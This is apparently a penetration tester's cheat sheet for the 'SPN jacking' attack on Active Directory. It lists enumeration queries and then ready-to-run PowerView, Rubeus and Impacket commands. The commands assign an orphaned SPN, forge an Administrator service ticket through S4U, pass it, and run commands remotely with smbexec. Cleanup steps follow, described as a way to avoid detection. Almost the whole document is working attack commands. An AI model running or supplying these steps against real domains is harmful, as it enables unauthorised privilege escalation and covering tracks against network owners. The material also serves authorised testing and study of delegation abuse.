# SPN Jacking Attack

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

## Overview
Abuse `WriteSPN` permission on a computer account to assign an orphaned SPN (one referenced in another account's `msDS-AllowedToDelegateTo` but no longer registered). This hijacks the constrained delegation trust path, enabling S4U attacks to forge tickets to the target service.

## Enumeration

### Find WriteSPN Permissions [added: 2026-04]
- **Tags:** #SPNJacking #WriteSPN #ACLEnum #PowerView #BloodHound #DelegationAbuse #T1134
- **Trigger:** BloodHound shows WriteSPN edge to computer object; checking for SPN modification rights
- **Prereq:** PowerView or BloodHound; valid domain user context
- **Yields:** Users with WriteSPN permissions on computer objects (SPN modification targets)
- **Opsec:** Low
- **Context:** Identify which users can modify SPNs on computer objects
- **Payload/Method:**
  ```powershell
  # PowerView — find WriteSPN permissions for a specific user
  Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID <USER>)}
  ```
  ```cypher
  # BloodHound Cypher — list WriteSPN attack paths
  MATCH p=(n:User)-[r1:WriteSPN*1..]->(c:Computer) RETURN p
  ```

### Find Constrained Delegation and Orphaned SPNs [added: 2026-04]
- **Tags:** #SPNJacking #ConstrainedDelegation #OrphanedSPN #findDelegation #Impacket #T1134
- **Trigger:** Constrained delegation configurations found; checking for orphaned SPNs
- **Prereq:** PowerView or Impacket; valid domain credentials
- **Yields:** Computers with constrained delegation and orphaned SPNs (hijackable trust paths)
- **Opsec:** Low
- **Context:** Identify computers with constrained delegation and check for orphaned SPNs
- **Payload/Method:**
  ```powershell
  # List computers with constrained delegation
  Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

  # Check for orphaned SPNs (SPN in AllowedToDelegateTo but not registered anywhere)
  Get-ConstrainedDelegation -CheckOrphaned

  # List all constrained delegation configs
  Get-ConstrainedDelegation
  ```
  ```bash
  # Impacket from Linux
  proxychains4 -q findDelegation.py -target-domain <DOMAIN> -dc-ip <DC_IP> -dc-host <DC_HOST> <DOMAIN>/<USER>:<PASSWORD>
  ```

## Exploitation — Windows

### Assign Orphaned SPN + S4U Attack [added: 2026-04]
- **Tags:** #SPNJacking #S4U #Rubeus #OrphanedSPN #TicketForging #ConstrainedDelegation #T1558
- **Trigger:** WriteSPN confirmed on target computer; orphaned SPN identified
- **Prereq:** WriteSPN on target computer; identified orphaned SPN from constrained delegation config
- **Yields:** Forged service ticket as Administrator via S4U abuse of hijacked delegation path
- **Opsec:** Med
- **Context:** WriteSPN on target computer, identified orphaned SPN from constrained delegation config
- **Payload/Method:**
  ```powershell
  # Step 1: Assign orphaned SPN to target machine
  Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{serviceprincipalname='<ORPHANED_SPN>'} -Verbose

  # Step 2: S4U to forge ticket as Administrator
  .\Rubeus.exe s4u /domain:<DOMAIN> /user:<DELEGATION_ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:"<ORPHANED_SPN>" /nowrap

  # Step 3: Alter service name if needed (e.g., change to CIFS for file access)
  .\Rubeus.exe tgssub /ticket:<BASE64_TICKET> /altservice:<TARGET_SERVICE>/<TARGET_HOST>

  # Step 4: Pass the ticket
  .\Rubeus.exe ptt /ticket:<BASE64_TICKET>
  ```

### Cleanup [added: 2026-04]
- **Tags:** #SPNJacking #Cleanup #SPNRemoval #ArtifactRemoval #PostExploit #T1070
- **Trigger:** After successful SPN jacking exploitation; need to restore original state
- **Prereq:** PowerView loaded; knowledge of target computer identity
- **Yields:** Removal of injected SPN to avoid detection
- **Opsec:** Low
- **Context:** Remove the SPN after exploitation
- **Payload/Method:**
  ```powershell
  Set-DomainObject -Identity <TARGET_COMPUTER> -Clear 'serviceprincipalname' -Verbose
  ```

## Exploitation — Linux

### SPN Jacking via Impacket [added: 2026-04]
- **Tags:** #SPNJacking #Impacket #addspn #getST #S4U #LinuxAttack #ProxyChains #T1558
- **Trigger:** WriteSPN confirmed; attacking from Linux via SOCKS proxy
- **Prereq:** WriteSPN on target; Impacket tools; SOCKS proxy to domain network
- **Yields:** Forged service ticket as Administrator via S4U from Linux toolchain
- **Opsec:** Med
- **Context:** Same attack chain from Linux through SOCKS proxy
- **Payload/Method:**
  ```bash
  # Step 1: Clear existing SPNs (if needed) and set orphaned SPN
  proxychains4 -q python3 addspn.py <DC_IP> -u '<DOMAIN>/<USER>' -p <PASSWORD> --clear -t '<TARGET_COMPUTER>'
  proxychains4 -q python3 addspn.py <DC_IP> -u '<DOMAIN>/<USER>' -p <PASSWORD> -t '<TARGET_COMPUTER>' --spn '<ORPHANED_SPN>'

  # Step 2: S4U to forge ticket
  proxychains4 -q getST.py -spn '<ORPHANED_SPN>' -impersonate Administrator '<DOMAIN>/<DELEGATION_ACCOUNT>' -hashes :<HASH> -dc-ip <DC_IP>

  # Step 3: Alter service name if needed
  proxychains4 -q python3 tgssub.py -in <TICKET_FILE> -altservice "<SERVICE>/<HOST>" -out <NEW_TICKET_FILE>

  # Step 4: Use the ticket
  KRB5CCNAME=<TICKET_FILE> smbexec.py -k -no-pass <TARGET_HOST>

  # Combined: S4U + altservice in one command
  proxychains4 -q getST.py -spn '<ORPHANED_SPN>' -impersonate Administrator '<DOMAIN>/<DELEGATION_ACCOUNT>' -hashes :<HASH> -dc-ip <DC_IP> -altservice "<SERVICE>/<HOST>"
  ```

### Restore Original SPNs [added: 2026-04]
- **Tags:** #SPNJacking #Cleanup #SPNRestore #PostExploit #OriginalState #T1070
- **Trigger:** After exploitation; need to restore all original SPNs
- **Prereq:** Saved list of original SPNs; addspn.py tool
- **Yields:** Restored original SPN configuration on target computer
- **Opsec:** Low
- **Context:** Restore all original SPNs from a saved list after exploitation
- **Payload/Method:**
  ```bash
  for spn in $(cat <SPN_FILE>); do
    proxychains4 -q python3 addspn.py <DC_IP> -u '<DOMAIN>/<USER>' -p <PASSWORD> -t '<TARGET_COMPUTER>' --spn $spn
  done
  ```

### Inspect Forged Tickets [added: 2026-04]
- **Tags:** #SPNJacking #TicketInspection #describeTicket #Verification #KerberosTicket #T1558
- **Trigger:** After ticket forging; need to verify ticket contents before use
- **Prereq:** describeTicket.py tool; forged ticket file
- **Yields:** Detailed ticket contents (service, impersonated user, flags, expiry)
- **Opsec:** Low
- **Context:** Verify ticket contents before using
- **Payload/Method:**
  ```bash
  describeTicket.py <TICKET_FILE>
  ```
